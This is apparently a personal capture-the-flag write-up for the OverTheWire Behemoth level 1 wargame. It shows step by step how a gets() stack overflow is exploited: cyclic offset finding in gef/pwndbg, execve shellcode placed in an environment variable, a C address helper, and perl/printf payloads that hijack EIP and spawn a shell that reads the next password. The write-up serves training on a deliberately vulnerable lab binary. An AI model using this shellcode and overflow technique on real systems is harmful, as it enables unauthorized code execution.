# Behemoth Level 0 → Level 1 Buffer Overflow w/ gef or pwndbg

## Previous Flag
<b>8YpAQCAuKf</b>

## Goal
Be able to log onto OverTheWire SSH server: behemoth.labs.overthewire.org. Given user <b>behemoth1</b> and port <b>2221</b>.

There is no information for this level, intentionally.

## What I learned
```
Important Bash Rules: These two are NOT the same (Bash interprets escape sequences differently)
export SHELLCODE=$'\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80' ⌨️
   $'...' is ANSI-C quoting in Bash
   Escape sequences like \xNN, \n, \t are interpreted into their actual byte values
   Produces a binary string with the correct bytes
export SHELLCODE=$"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80" ⌨️⚠️
   $"..." is for locale-aware translation (gettext)
   Escape sequences like \xNN are not interpreted

Example:
$ echo -n $'\x41\x42\x43' | xxd ⌨️
00000000: 4142 43                                  ABC
$ echo -n $"\\x41\\x42\\x43" | xxd ⌨️
00000000: 5c78 3431 5c78 3432 5c78 3433                  \x41\x42\x43
```

## Solution
```
PS C:\Users\trung.DESKTOP-G7C81CH\Downloads\01noobHacker> ssh behemoth1@behemoth.labs.overthewire.org -p 2221 ⌨️
behemoth1@behemoth:~$ cd /behemoth/ ⌨️
behemoth1@behemoth:/behemoth$ ./behemoth1 ⌨️
Password: AAAA ⌨️
Authentication failure.
Sorry.
behemoth1@behemoth:/behemoth$ ./behemoth1 ⌨️
Password: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ⌨️ 
Authentication failure.
Sorry.
Segmentation fault                                                # Vulnerability Located: Buffer Overflow
behemoth1@behemoth:/behemoth$ ltrace ./behemoth1 ⌨️
__libc_start_main(0x804909d, 1, 0xffffd454, 0 <unfinished ...>
printf("Password: ")                                                                      = 10
gets(0xffffd355, 0xf7fc7000, 0, 0Password: AAAA
)                                                        = 0xffffd355
puts("Authentication failure.\nSorry."Authentication failure.
Sorry.
)                                                   = 31
+++ exited (status 0) +++

# Find Offset by luck or
behemoth1@behemoth:/behemoth$ ./behemoth1 ⌨️
Password: 1234567890123456789012345678901234567890123456789012345678901234567890 ⌨️
Authentication failure.
Sorry.
behemoth1@behemoth:/behemoth$ ./behemoth1 ⌨️
Password: 12345678901234567890123456789012345678901234567890123456789012345678901 ⌨️     # Offset is 70, bc 71 failed
Authentication failure.
Sorry.
Segmentation fault

behemoth1@behemoth:/behemoth$ gef ./behemoth1 ⌨️
gef➤  disassemble main ⌨️
Dump of assembler code for function main:
   0x08049186 <+0>:     push   ebp
   0x08049187 <+1>:     mov    ebp,esp
   0x08049189 <+3>:     sub    esp,0x44
   0x0804918c <+6>:     push   0x804a008
   0x08049191 <+11>:    call   0x8049040 <printf@plt>
   0x08049196 <+16>:    add    esp,0x4
   0x08049199 <+19>:    lea    eax,[ebp-0x43]
   0x0804919c <+22>:    push   eax
   0x0804919d <+23>:    call   0x8049050 <gets@plt> 👀
   0x080491a2 <+28>:    add    esp,0x4
   0x080491a5 <+31>:    push   0x804a014
   0x080491aa <+36>:    call   0x8049060 <puts@plt>
   0x080491af <+41>:    add    esp,0x4
   0x080491b2 <+44>:    mov    eax,0x0
   0x080491b7 <+49>:    leave
   0x080491b8 <+50>:    ret
End of assembler dump.

# tmux: Ctrl + Shift + % ⌨️                                   # pwndbg
gef➤  pattern create 100 ⌨️❤️                                pwndbg > cyclic 100 ⌨️❤️
[+] Generating a pattern of 100 bytes (n=4)
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa 👀
[+] Saved as '$_gef0'
gef➤  run ⌨️
Starting program: /behemoth/behemoth1 ⌨️
Download failed: Permission denied.  Continuing without separate debug info for system-supplied DSO at 0xf7fc7000.
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Password: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa ⌨️

[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── register
s ────
$eax   : 0x0
$ebx   : 0xf7fade34  →  ",\r#"
$ecx   : 0xf7faf8a0  →  0x00000000
$edx   : 0x0
$esp   : 0xffffd380  →  "ataaauaaavaaawaaaxaaayaaa"
$ebp   : 0x61617261 ("araa"?)
$esi   : 0xffffd43c  →  0xffffd5ac  →  "SHELL=/bin/bash"
$edi   : 0xf7ffcb60  →  0x00000000
$eip   : 0x61617361 ("asaa"?) 👀
$eflags: [zero carry parity adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63
───────────────────────────────────────────────────────────────── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x61617361
───────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "behemoth1", stopped 0x61617361 in ?? (), reason: SIGSEGV

# Find Offset                                                  # pwndbg
gef➤  pattern offset asaa ⌨️❤️                               pwndbg > cyclic -l asaa ⌨️❤️
[+] Searching for '61617361'/'61736161' with period=4          Finding cyclic pattern of 4 bytes: b'asaa' (hex: 0x613736161)
[+] Found at offset 70 (little-endian sear 👀                  Found at offset 71      # Crashed when reached 71
                                                                                       # Note: Starts at 0 Ends: 70 (71 total)
gef➤  exit ⌨️
warning: Could not rename /home/behemoth1/.gdb_history-gdb1045244~ to /home/behemoth1/.gdb_history: No such file or directory

# Create Shell Code
Source: https://shell-storm.org/shellcode/files/shellcode-606.html
33 bytes: \x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80
behemoth1@behemoth:/behemoth$ export SHELLCODE=$'\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80' ⌨️
behemoth1@behemoth:/behemoth$ env | grep -e "SHELLCODE" ⌨️
grep: (standard input): binary file matches                          # grep sees non-printable bytes and complains
behemoth1@behemoth:/behemoth$ env | xxd | grep -e "SHELL" ⌨️
00000000: 5348 454c 4c3d 2f62 696e 2f62 6173 680a  SHELL=/bin/bash.
00000010: 5348 454c 4c43 4f44 453d 6a0b 5899 5266  SHELLCODE=j.X.Rf
behemoth1@behemoth:/behemoth$ mktemp -d ⌨️
/tmp/tmp.McWIow4k1K
behemoth1@behemoth:/behemoth$ cd /tmp/tmp.McWIow4k1K ⌨️
behemoth1@behemoth:/tmp/tmp.McWIow4k1K$ chmod 777 /tmp/tmp.McWIow4k1K ⌨️
behemoth1@behemoth:/tmp/tmp.McWIow4k1K$ vi envAddr.c ⌨️
behemoth1@behemoth:/tmp/tmp.McWIow4k1K$ cat envAddr.c ⌨️
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// ./envAdddr SHELLCODE /behemoth/behemoth1
int main(int argc, char* argv[]) {
   char *ptr;

   // Get the environment variable specified by the first command-line argument
   // Example: if argv[1] = "SHELLCODE", this gets the value of SHELLCODE
   ptr = getenv(argv[1]);

   // Adjust the pointer to account for differences in string lengths between
   // the program name (argv[0]) and the third argument (argv[2]).
   // Why multiply by 2? 
   // In some systems (like Linux/x86), the environment variables and 
   // command-line arguments are stored on the stack as arrays of pointers.
   // The difference in lengths affects the stack layout. 
   // Multiplying by 2 roughly compensates for how much the environment
   // variable's actual location shifts relative to argv[0] and argv[2].
   ptr += (strlen(argv[0]) - strlen(argv[2]))*2;

   // Print the environment variable name and the adjusted memory address
   printf("%s will be at %p\n", argv[1], ptr);

   return 0;
}
behemoth1@behemoth:/tmp/tmp.McWIow4k1K$ gcc -m32 -o envAddr envAddr.c ⌨️
behemoth1@behemoth:/tmp/tmp.McWIow4k1K$ file envAddr ⌨️
envAddr: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=5ba7afe14cc81199a902c5f2d4e9004c830fe47a, for GNU/Linux 3.2.0, not stripped
behemoth1@behemoth:/tmp/tmp.McWIow4k1K$ ./envAddr SHELLCODE /behemoth/behemoth1 ⌨️
SHELLCODE will be at 0xffffd5a4 👀

# Which endian format used using lscpu
behemoth1@behemoth:/tmp/tmp.McWIow4k1K$ lscpu | grep -i "endian" ⌨️❤️
Byte Order:                           Little Endian
So address shell code exist is 0xffffd5a4 = \xa4\xd5\xff\xff 👀
So we want EIP to return this address
behemoth1@behemoth:/tmp/tmp.McWIow4k1K$ which perl ⌨️
/usr/bin/perl

# Run payload, Note: 70 Not work because offset is 70
behemoth1@behemoth:/tmp/tmp.McWIow4k1K$ (perl -e 'print "A" x 70 . "\xa4\xd5\xff\xff";') | /behemoth/behemoth1 ⌨️
Password: Authentication failure.
Sorry.
Segmentation fault
behemoth1@behemoth:/tmp/tmp.McWIow4k1K$ (perl -e 'print "A" x 71 . "\xa4\xd5\xff\xff";'; cat) | /behemoth/behemoth1 ⌨️
whoami ⌨️
Password: Authentication failure.
Sorry.
whoami ⌨️
behemoth2
find / -type f -name "behemoth2" 2>/dev/null ⌨️
/behemoth/behemoth2
/etc/behemoth_pass/behemoth2
cat /etc/behemoth_pass/behemoth2 ⌨️
IxPJbQtH8q 🔐
exit ⌨️
behemoth1@behemoth:/tmp/tmp.McWIow4k1K$ (printf 'a%.0s' {1..71}; printf '\xa4\xd5\xff\xff'; cat) | /behemoth/behemoth1 ⌨️
whoami ⌨️
Password: Authentication failure.
Sorry.
whoami ⌨️
behemoth2
cat /etc/behemoth_pass/behemoth2 ⌨️
IxPJbQtH8q 🔐
```

## Flag
<b>IxPJbQtH8q</b>

## Continue
[Continue](./Behemoth0102.md)